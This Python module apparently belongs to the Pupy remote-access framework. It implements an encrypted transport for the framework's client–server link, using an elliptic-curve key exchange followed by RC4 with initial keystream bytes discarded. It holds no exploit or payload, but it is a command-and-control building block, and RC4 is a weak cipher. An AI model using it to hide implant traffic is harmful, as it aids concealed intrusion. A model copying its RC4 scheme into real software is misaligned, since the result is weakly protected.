# -*- coding: utf-8 -*-

""" EC4 PSK transport """

__all__ = ['EC4TransportServer', 'EC4TransportClient']

from ..base import BasePupyTransport
from ...lib.picocmd.ecpv import ECPV

from network.lib.buffer import Buffer

import struct
import time
import random

from Crypto.Cipher import ARC4
from Crypto.Hash import SHA384

class EC4Transport(BasePupyTransport):

    __slots__ = ('encryptor', 'decryptor', 'up_buffer')

    privkey = None
    pubkey  = None

    def __init__(self, *args, **kwargs):
        super(EC4Transport, self).__init__(*args, **kwargs)
        if not self.pubkey and not self.privkey:
            raise ValueError('Public or Private key required for EC4')

        if self.pubkey:
            self.encoder = ECPV(
                curve='brainpoolP384r1',
                public_key=self.pubkey,
                hash=SHA384
            )
        else:
            self.encoder = ECPV(
                curve='brainpoolP384r1',
                public_key=self.privkey,
                hash=SHA384
            )

        self.encryptor = None
        self.decryptor = None
        self.up_buffer = Buffer()

    def kex(self, data):
        if len(data) < 2:
            return False

        length, = struct.unpack_from('H', data.peek(2))
        if len(data) < 2 + length:
            return False

        request = data.read(2 + length)

        if self.privkey:
            response, key = self.encoder.process_kex_request(request[2:], 0, key_size=128)
            # Add jitter, tinyec is quite horrible
            time.sleep(random.random())
            self.downstream.write(struct.pack('H', len(response)) + response)
        else:
            key = self.encoder.process_kex_response(request[2:], 0, key_size=128)

        self.encryptor = ARC4.new(key=key[0])
        self.decryptor = ARC4.new(key=key[1])

        # https://wikileaks.org/ciav7p1/cms/files/NOD%20Cryptographic%20Requirements%20v1.1%20TOP%20SECRET.pdf
        # Okay...
        self.encryptor.encrypt('\x00'*3072)
        self.decryptor.decrypt('\x00'*3072)
        return True

    def downstream_recv(self, data):
        if self.encryptor:
            data.write_to(self.upstream, modificator=self.decryptor.decrypt)

        elif self.kex(data):
            if self.up_buffer:
                self.up_buffer.write_to(self.downstream, modificator=self.encryptor.encrypt)
                self.up_buffer = None

            if len(data):
                data.write_to(self.upstream, modificator=self.decryptor.decrypt)

    def upstream_recv(self, data):
        if self.encryptor:
            data.write_to(self.downstream, modificator=self.encryptor.encrypt)
        else:
            data.write_to(self.up_buffer)

class EC4TransportServer(EC4Transport):
    __slots__ = ()

class EC4TransportClient(EC4Transport):
    __slots__ = ()

    def on_connect(self):
        req = self.encoder.generate_kex_request()
        self.downstream.write(
            struct.pack('H', len(req)) + req
        )
